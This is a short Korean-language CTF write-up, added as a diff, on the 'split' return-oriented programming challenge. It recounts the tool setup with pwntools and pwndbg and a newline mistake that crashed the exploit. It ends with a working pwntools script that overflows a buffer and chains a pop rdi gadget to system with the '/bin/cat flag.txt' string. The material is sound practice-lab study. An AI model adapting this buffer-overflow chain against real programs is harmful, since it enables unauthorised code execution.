@@ -1,0 +1,22 @@
+#Split
+
+먼저 굉장한 시간을 들인 문제.
+gdb만 사용해서 /bin/cat flag.txt라는 문자열을 찾다 못해 결국 pwntools와 pwndbg를 이용하여 해결.. 이걸 수확이라고 해야 하나??
+
+pwntools과 pwndbg도 python버전 안맞아서 3시간은 소비한 듯. 그래도 환경 구성을 완료했으니 다행이라고 해야하나;;
+
+암튼 다 깔고 난 후 search "/bin/cat" 해서 실제 run했을 때 메모리에 올라오는 영역을 쉽게 찾아서 python 하드코딩하여 flag알아냄.
+
+마지막에서 payload를 sendline으로 보내다가 개행문자까지 보내버려서 Segfault가 떠버림.
+
+from pwn import *
+context.bits=64
+pop_rdi = 0x00000000004007c3
+system = 0x000000000040074b
+bincat_addr = 0x00601060
+payload = b"A"*40 + p64(pop_rdi) + p64(bincat_addr) + p64(system)
+p=process("./split")
+p.send(payload)
+p.interactive()
+
+이렇게 해결하면 됨.
